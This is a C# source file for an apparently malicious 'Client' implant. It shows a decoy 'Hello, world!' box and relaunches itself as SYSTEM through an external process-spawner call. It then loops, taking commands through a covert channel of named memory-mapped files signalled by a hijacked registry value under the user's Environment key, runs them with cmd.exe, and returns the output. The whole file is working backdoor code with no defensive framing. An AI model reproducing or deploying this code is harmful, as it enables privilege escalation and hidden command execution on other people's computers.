using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Threading;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Windows.Forms;
using System.Reflection;


namespace Client
{
    class Program
    {
        public static string GetUserSid()
        {
            string sid;
            string query = "SELECT UserName FROM Win32_ComputerSystem";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
            {
                var username = (string)searcher.Get().Cast<ManagementBaseObject>().First()["UserName"];

                string[] res = username.Split('\\');
                if (res.Length != 2) throw new InvalidOperationException("Invalid username format.");

                string domain = res[0];
                string name = res[1];
                query = $"SELECT Sid FROM Win32_UserAccount WHERE Domain = '{domain}' AND Name = '{name}'";
                using (ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(query))
                {
                    sid = (string)searcher2.Get().Cast<ManagementBaseObject>().First()["Sid"];
                }
            }
            return sid;
        }

        public static byte[] RunCommand(string command)
        {
            byte[] outputBytes = null;
            ProcessStartInfo proc = new ProcessStartInfo();
            proc.Arguments = $"/c {command}";
            proc.FileName = "cmd.exe";
            proc.RedirectStandardOutput = true;
            proc.UseShellExecute = false;
            Process process = Process.Start(proc);
            using (MemoryStream ms = new MemoryStream())
            {
                process.StandardOutput.BaseStream.CopyTo(ms);
                if (ms.Length > 0)
                {
                    outputBytes = ms.ToArray();
                }
                else
                {
                    outputBytes = new byte[0];
                }
            }
            process.WaitForExit();
            process.Close();
            

            return outputBytes;
        }

        public static byte[] Exctract(string name)
        {
            byte[] byteData;
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Default))
            {
                using (RegistryKey subkey = key.OpenSubKey($"{GetUserSid()}\\Environment", true))
                {
                    subkey.SetValue("UserEnvironment", 12, RegistryValueKind.DWord);
                    MemoryMappedFile mmf = GetExistingMMF(name);
                    if (mmf == null)
                    {
                        throw new Exception("Timed out waiting for MemoryMappedFile to become available");
                    }
                    using (MemoryMappedViewAccessor view = mmf.CreateViewAccessor())
                    {
                        byteData = extractMmfData(view);
                        view.Dispose();
                        mmf.Dispose();
                        subkey.SetValue("UserEnvironment", 1, RegistryValueKind.DWord);
                        subkey.Close();
                        key.Close();
                    }
                }
            }
            Console.WriteLine("Data Recived");
            return byteData;
        }

        private static MemoryMappedFile GetExistingMMF(string name)
        {
            int c = 0;
            MemoryMappedFile mmf;
            while (c < 125)
            {
                try
                {
                    mmf = MemoryMappedFile.OpenExisting(name);
                    return mmf;
                }
                catch
                {
                    Thread.Sleep(40);
                }
                c += 1;
            }
            return null;
        }

        private static byte[] extractMmfData(MemoryMappedViewAccessor view)
        {
            byte[] byteData = new byte[view.Capacity];
            view.ReadArray(0, byteData, 0, (int)view.Capacity);
            view.Dispose();
            return byteData;
        }

        private static byte[] unpad(byte[] paddedData)
        {
            int c = paddedData.Length - 1;
            while (paddedData[c] != 114)
            {
                c--;
            }
            return paddedData.Take(c).ToArray();
        }

        static bool SendData(byte[] output)
        {
            MemoryMappedFile mmf;
            MemoryMappedViewAccessor view;
            byte[] pad = new byte[] { 114 };
            output = output.Concat(pad).ToArray();
            using (RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Default))
            {
                using (RegistryKey subkey = key.OpenSubKey($"{GetUserSid()}\\Environment", true))
                {
                    if ((int)subkey.GetValue("UserEnvironment") == 12)
                    {
                        subkey.SetValue("UserEnvironment", 0, RegistryValueKind.DWord);
                        using (mmf = MemoryMappedFile.CreateNew("MMMFFF", output.Length))
                        {
                            view = mmf.CreateViewAccessor();
                            view.WriteArray(0, output, 0, output.Length);
                            view.Flush();
                            view.Dispose();
                            int c = 0;
                            while (((int)subkey.GetValue("UserEnvironment") == 0) && c < 750)
                            {
                                Thread.Sleep(40);
                                c++;
                            }
                            for (int n = 0; n < 2; n++)
                            {
                                mmf.Dispose();
                            }
                            return true;
                        }
                    }
                }
            }
            return false;
        }


        public static string GetCommand()
        {
            while (true)
            {
                try
                {
                    byte[] data = Exctract("MMMFFFC");
                    if (data != null)
                    {
                        return System.Text.Encoding.UTF8.GetString(unpad(data));
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.Message);
                }
                Thread.Sleep(30);
            }
        }

        static void Main(string[] args)
        {
            MessageBox.Show("Hello, world!");
            string user = System.Text.Encoding.UTF8.GetString(RunCommand("whoami"));
            Assembly currentAssembly = Assembly.GetExecutingAssembly();
            string location = currentAssembly.Location;
            if (!(user.ToUpper()).Contains("SYSTEM"))
            {
                ProcessSpawner.ProcessSpawner.SpawnSystem(980, $"start {location}");
                Environment.Exit(0);
            }
            while (true)
            {
                try
                {
                    string x = GetCommand();
                    if (!SendData(RunCommand(x)))
                    {
                        Console.Write("no process listen to mmf");
                    }
                    else
                    {
                        Console.Write("Done!");
                    }
                }
                catch (Exception e)
                {
                    
                    System.Console.Write(e.ToString());
                }
            }
        }
    }
}
